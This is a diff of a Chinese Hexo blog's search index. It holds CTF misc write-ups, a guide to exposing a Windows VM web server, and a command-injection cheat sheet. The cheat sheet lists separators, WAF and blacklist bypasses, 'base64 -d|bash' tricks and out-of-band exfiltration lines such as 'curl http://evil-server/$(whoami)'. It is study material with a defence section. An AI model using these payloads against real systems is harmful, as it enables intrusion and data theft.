-<h1 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h1><p>[ACTF新生赛2020]明文攻击</p>
-<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>CRC爆破</li>
-</ul>
-<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
-<p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313202715767.png"></p>
-<p>新建成压缩包</p>
-<p>对比两个包</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203046943.png"></p>
-<p>两个包的CRC是一样的</p>
-<p>进行爆破</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203155571.png"></p>
-<h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
-<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>base64隐写</li>
-</ul>
-<h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/zxy13/Desktop/2022311/10/近在眼前/ComeOn!.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line[:-<span class="number">1</span>]</span><br><span class="line">        num = line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        lastchar = line[-(num + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(line,num,lastchar)</span></span><br><span class="line">        myindex = base64chars.index(lastchar)</span><br><span class="line">        <span class="comment"># print(myindex)</span></span><br><span class="line">        bin_str = <span class="built_in">bin</span>(myindex)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># print(bin_str)</span></span><br><span class="line">        flag += bin_str[<span class="number">6</span> - <span class="number">2</span> * num:]</span><br><span class="line">        <span class="comment"># print(bin_str[6-2*num:])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>
-
-<p>运行得到</p>
-<p><strong><code>ACTF&#123;6aseb4_f33!&#125;</code></strong></p>
+<h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><p>虚拟机安安装就不嘴碎了，估计网上有许多教材，自己参考大佬再写。</p>
+<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>安装Window10虚拟机，我选择专业版与自定义安装。</p>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>对虚拟机内的windows进行端口配置</p>
+<p>打开控制面板中系统和安全，打开防火墙设置，然后打开高级设置。</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192438-cgxcimc.png" alt="image.png"></p>
+<p>选择“入站规则” —&gt; “新建规则”</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192919-b07jjg4.png" alt="image.png"></p>
+<p>选择TCP，开放端口可以自己设置。</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192848-ai6dfyx.png" alt="image.png"></p>
+<p>接下来默认就可以了。</p>
+<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>下载宝塔面板 ：<a href="https://www.bt.cn/">宝塔官网</a></p>
+<p>安装完成注册，打开宝塔面板</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193333-87xordg.png" alt="image.png"></p>
+<p>红框里保持默认，尽量不要修改。</p>
+<p>安装进去网站后，安装Nginx套件就好了。</p>
+<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>安装注册花生壳，自己注册后就会得到一个域名</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193702-hpmbecv.png" alt="image.png"></p>
+<p>然后新建一个自定义映射</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193914-5x22eh1.png" alt="image.png"></p>
+<p>映射成功就好了。</p>
+<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>在宝塔里面添加站点</p>
+<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326194149-fcey653.png" alt="image.png"></p>
+<p>默认就好。剩下就是你自己写站点了。</p>
 ]]></content>
       <categories>
-        <category>杂项</category>
+        <category>服务器</category>
       </categories>
       <tags>
-        <tag>Misc</tag>
+        <tag>内网穿透</tag>
+        <tag>虚拟机</tag>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行</title>
+    <url>/2022/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<span id="more"></span>
+
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>() = ``</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">peoc</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_opne</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成<span class="built_in">bool</span>条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;<span class="number">123</span></span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$<span class="number">9</span>，因为$<span class="number">9</span>是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo <span class="string">&quot;bHM&quot;</span>= | base64 -d //base64编码</span><br><span class="line">echo <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?<span class="keyword">in</span>/?s &gt; /<span class="built_in">bin</span>/ls</span><br><span class="line">未定义的初始化变量 cat$<span class="number">4</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&#x27;&#x27;</span>ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/<span class="built_in">bin</span>/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span></span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]<span class="string">&#x27;&#x27;</span>[t] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">$<span class="comment"># 是传给脚本的参数个数</span></span><br><span class="line">$<span class="number">0</span> 是脚本本身的名字</span><br><span class="line">$<span class="number">1</span> 是传递给该shell脚本的第一个参数</span><br><span class="line">$<span class="number">2</span> 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过<span class="number">9</span>个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，<span class="number">0</span>表示没有错误，其他表示有错误</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls &#x2F;usr&#x2F;bin&#x2F;?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">* <span class="number">0</span>到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 <span class="comment">#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1009,94 +1055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>每日Misc一</title>
-    <url>/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/</url>
-    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>今日刷题</p>
-<span id="more"></span>
-
-<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png"></p>
-<p>一张图片</p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
-<li>文件分离</li>
-<li>ELF文件</li>
-</ul>
-<p>命令：file、binwalk、foremost</p>
-<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>文件题目是file carving</p>
-<p>第一时间kali查看文件，发现有其他文件，进行文件分离</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png"></p>
-<p>分离文件中有压缩包，解压得到文件</p>
-<p>使用file命令发现是ELF文件，运行得到flag</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png"></p>
-<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到题</p>
-<p>下载解压查看</p>
-<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Challenge description:</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">I really hope you are INSAne, but if that&#x27;s not the case </span></span><br><span class="line"><span class="attribute">and that you don&#x27;t want to validate the &quot;INSAnity&quot; challenge </span></span><br><span class="line"><span class="attribute">then maybe you would like to validate this one? </span></span><br><span class="line"><span class="attribute">Here is your flag, you disapointing and boring fellow</span><span class="punctuation">: </span></span><br><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
-<li>Steghide隐写</li>
-<li>png文件头</li>
-<li>unicode编码</li>
-</ul>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>音频隐写的方式，但是没有密码或者Key。文件分离，也没有发现。听，也没有发现什么信息。</p>
-<p>想到<code>Steghide</code>是一个可以将文件隐藏到图片或音频中的工具，使用命令：<code>steghide extract -sf out.wav </code>（无密码）</p>
-<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">┌──(root💀kali)-[~/桌面/CTF/MISC]</span></span><br><span class="line"><span class="attribute">└─# steghide extract -sf out.wav </span></span><br><span class="line"><span class="attribute">Enter passphrase</span><span class="punctuation">: </span></span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查看文件得到一个网址：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a></p>
-<p>打开网站。下载得到图片</p>
-<p>图片损坏不能正常显示，用010查看文件，文件头错误 </p>
-<p><code>89 50 4E 47</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png"></p>
-<p>打开得到编码</p>
-<p><code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p>
-<p>unicode解码得到</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png"></p>
-<p>经过尝试，把两个数字相加，出题人鬼才，得到flag{5304}</p>
-<h2 id="BUUCTF-voip"><a href="#BUUCTF-voip" class="headerlink" title="BUUCTF voip"></a>BUUCTF voip</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
-<li>流量包分析</li>
-<li>voip通话</li>
-</ul>
-<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开流量包</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png"></p>
-<p>在voip通话之中有英语听力，flag就在里面。考听力。</p>
-<p> flag{9001IVR}</p>
-<h2 id="BUUCTF-Business-Planning-Group"><a href="#BUUCTF-Business-Planning-Group" class="headerlink" title="BUUCTF Business Planning Group"></a>BUUCTF Business Planning Group</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
-<li>BPG图片</li>
-<li>图片隐写</li>
-<li>base64编码</li>
-</ul>
-<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到图片</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png"></p>
-<p>用binwalk、foremost 也没得到有用的信息。</p>
-<p>在010查看发现文件尾有个BPG</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png"></p>
-<p><strong>维基百科</strong></p>
-<p><strong>BPG</strong>格式，全称“<strong>Better Portable Graphics</strong>”（更好的便携式图像），它是一个声称比现时最流行的<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>压缩格式更优秀的<a href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9" title="图像压缩">图像压缩</a>方案，由法国的程序员<a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%B8%83%E9%87%8C%E6%96%AF%C2%B7%E8%B4%9D%E6%8B%89" title="法布里斯·贝拉">法布里斯·贝拉</a>（Fabrice Bellard）于2014年创建。他将影像编码格式中的技术运用到了图像编码，以达至更理想的压缩比率，而不同于<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>为提高压缩比而牺牲画质的方式 ^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-bellard-1">[1]</a>^^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-techbang-2">[2]</a>^ 。该影像编码格式基于<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%95%88%E7%8E%87%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81" title="高效率视频编码">高效率视频编码</a>（HEVC）的<a href="https://zh.wikipedia.org/wiki/%E5%B9%80%E5%85%A7%E7%B7%A8%E7%A2%BC" title="帧内编码">帧内编码</a>技术改良而成。</p>
-<p><strong>BPG (Better Portable Graphics)</strong> 是一个新的图片格式，目的是保证质量或者文件大小限制的情况下替换 JPEG 格式，主要特性：</p>
-<ul>
-<li>高压缩率</li>
-<li>支持大部分 Web 浏览器，带有一个小的 JavaScript 解码器 (gzipped size: 56 KB).</li>
-<li>基于 <a href="http://en.wikipedia.org/wiki/High_Efficiency_Video_Coding">HEVC</a> 开放视频压缩标准的子集</li>
-<li>支持跟 JPEG 的相同色度(grayscale, YCbCr 4:2:0, 4:2:2, 4:4:4) ，降低转换损失</li>
-<li>原生支持每通道 8 到 14 位，更好的动态范围</li>
-<li>支持无损压缩</li>
-<li>各种元数据</li>
-<li>支持动态</li>
-</ul>
-<p>正常windows没有办法识别BPG</p>
-<p>用工具：<a href="https://bellard.org/bpg/bpg-0.9.8-win64.zip">https://bellard.org/bpg/bpg-0.9.8-win64.zip</a></p>
-<p>命令：<code>.\bpgview.exe .\1.bpg</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png"></p>
-<p><code>YnNpZGVzX2RIbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png"></p>
-<p>bsides_dHlhi{BPG_i5_b3tt3r_7h4n_JPG}</p>
-]]></content>
-      <categories>
-        <category>BUUCTF(Misc)</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>本博客搭建的记录(持续更新)</title>
     <url>/2022/%E6%9C%AC%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+NexT</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
@@ -1525,6 +1483,94 @@
       <tags>
         <tag>Hexo</tag>
         <tag>建站</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>每日Misc一</title>
+    <url>/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>今日刷题</p>
+<span id="more"></span>
+
+<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png"></p>
+<p>一张图片</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>文件分离</li>
+<li>ELF文件</li>
+</ul>
+<p>命令：file、binwalk、foremost</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>文件题目是file carving</p>
+<p>第一时间kali查看文件，发现有其他文件，进行文件分离</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png"></p>
+<p>分离文件中有压缩包，解压得到文件</p>
+<p>使用file命令发现是ELF文件，运行得到flag</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png"></p>
+<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到题</p>
+<p>下载解压查看</p>
+<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Challenge description:</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">I really hope you are INSAne, but if that&#x27;s not the case </span></span><br><span class="line"><span class="attribute">and that you don&#x27;t want to validate the &quot;INSAnity&quot; challenge </span></span><br><span class="line"><span class="attribute">then maybe you would like to validate this one? </span></span><br><span class="line"><span class="attribute">Here is your flag, you disapointing and boring fellow</span><span class="punctuation">: </span></span><br><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>Steghide隐写</li>
+<li>png文件头</li>
+<li>unicode编码</li>
+</ul>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>音频隐写的方式，但是没有密码或者Key。文件分离，也没有发现。听，也没有发现什么信息。</p>
+<p>想到<code>Steghide</code>是一个可以将文件隐藏到图片或音频中的工具，使用命令：<code>steghide extract -sf out.wav </code>（无密码）</p>
+<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">┌──(root💀kali)-[~/桌面/CTF/MISC]</span></span><br><span class="line"><span class="attribute">└─# steghide extract -sf out.wav </span></span><br><span class="line"><span class="attribute">Enter passphrase</span><span class="punctuation">: </span></span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看文件得到一个网址：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a></p>
+<p>打开网站。下载得到图片</p>
+<p>图片损坏不能正常显示，用010查看文件，文件头错误 </p>
+<p><code>89 50 4E 47</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png"></p>
+<p>打开得到编码</p>
